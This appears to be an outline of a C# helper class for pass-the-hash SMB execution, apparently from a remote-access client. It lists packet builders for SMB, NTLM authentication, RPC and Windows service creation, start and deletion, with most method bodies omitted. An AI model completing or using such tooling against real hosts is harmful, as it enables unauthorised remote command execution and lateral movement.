...
namespace xClient.Core.Helper
{
    class PTHSMBExecHelper
    {
        ...
        public static OrderedDictionary GetPacketNetBIOSSessionService(int packet_header_length, int packet_data_length)
        {
        ...
        public static OrderedDictionary GetPacketSMBHeader(byte[] packet_command, byte[] packet_flags, byte[] packet_flags2, byte[] packet_tree_ID, byte[] packet_process_ID, byte[] packet_user_ID)
        {
        ...
        public static OrderedDictionary GetPacketSMBNegotiateProtocolRequest(string packet_version)
        {
        ...
        public static OrderedDictionary GetPacketSMBSessionSetupAndXRequest(byte[] packet_security_blob)
        {
        ...
        public static OrderedDictionary GetPacketSMBTreeConnectAndXRequest(byte[] packet_path)
        {
        ...
        public static OrderedDictionary GetPacketSMBNTCreateAndXRequest(byte[] packet_named_pipe)
        {
        ...
        public static OrderedDictionary GetPacketSMBReadAndXRequest()
        {
        ...
        public static OrderedDictionary GetPacketSMBWriteAndXRequest(byte[] packet_file_ID, int packet_RPC_length)
        {
        ...
        public static OrderedDictionary GetPacketSMBCloseRequest(byte[] packet_file_ID)
        {
        ...
        public static OrderedDictionary GetPacketSMBTreeDisconnectRequest()
        {
        ...
        public static OrderedDictionary GetPacketSMBLogoffAndXRequest()
        {
        ...
        //SMB2
        public static OrderedDictionary GetPacketSMB2Header(byte[] packet_command, int packet_message_ID, byte[] packet_tree_ID, byte[] packet_session_ID)
        {
        ...
        public static OrderedDictionary GetPacketSMB2NegotiateProtocolRequest()
        {
        ...
        public static OrderedDictionary GetPacketSMB2SessionSetupRequest(byte[] packet_security_blob)
        {
        ...
        public static OrderedDictionary GetPacketSMB2TreeConnectRequest(byte[] packet_path)
        {
        ...
        public static OrderedDictionary GetPacketSMB2CreateRequestFile(byte[] packet_named_pipe)
        {
            byte[] packet_named_pipe_length = BitConverter.GetBytes(packet_named_pipe.Length);
            byte[] packet_named_pipe_length2 = { packet_named_pipe_length[0], packet_named_pipe_length[1] };
        ...
        public static OrderedDictionary GetPacketSMB2ReadRequest(byte[] packet_file_ID)
        {
        ...
        public static OrderedDictionary GetPacketSMB2WriteRequest(byte[] packet_file_ID, int packet_RPC_length)
        {
        ...
        public static OrderedDictionary GetPacketSMB2CloseRequest(byte[] packet_file_ID)
        {
        ...
        public static OrderedDictionary GetPacketSMB2TreeDisconnectRequest()
        {
        ...
        public static OrderedDictionary GetPacketSMB2SessionLogoffRequest()
        {
        ...
        //NTLM
        public static OrderedDictionary GetPacketNTLMSSPNegotiate(byte[] packet_negotiate_flags, byte[] packet_version)
        {
        ...
        public static OrderedDictionary GetPacketNTLMSSPAuth(byte[] packet_NTLM_response)
        {
        ...
        public static OrderedDictionary GetPacketRPCBind(int packet_call_ID, byte[] packet_max_frag, byte[] packet_num_ctx_items, byte[] packet_context_ID, byte[] packet_UUID, byte[] packet_UUID_version)
        {
        ...
        public static OrderedDictionary GetPacketRPCRequest(byte[] packet_flags, int packet_service_length, int packet_auth_length, int packet_auth_padding, byte[] packet_call_ID, byte[] packet_context_ID, byte[] packet_opnum, byte[] packet_data)
        {
        ...
        public static OrderedDictionary GetPacketSCMOpenSCManagerW(byte[] packet_service, byte[] packet_service_length)
        {
        ...
        public static OrderedDictionary GetPacketSCMCreateServiceW(byte[] packet_context_handle, byte[] packet_service, byte[] packet_service_length, byte[] packet_command, byte[] packet_command_length)
        {
            Random r = new Random();
            byte[] packet_referent_init = new byte[2];
            r.NextBytes(packet_referent_init);
        ...
        public static OrderedDictionary GetPacketSCMStartServiceW(byte[] packet_context_handle)
        {
        ...
        public static OrderedDictionary GetPacketSCMDeleteServiceW(byte[] packet_context_handle)
        {
        ...
        public static OrderedDictionary GetPacketSCMCloseServiceHandle(byte[] packet_context_handle)
        {
        ...
        public static ushort DataLength2(int length_start, byte[] string_extract_data)
        {
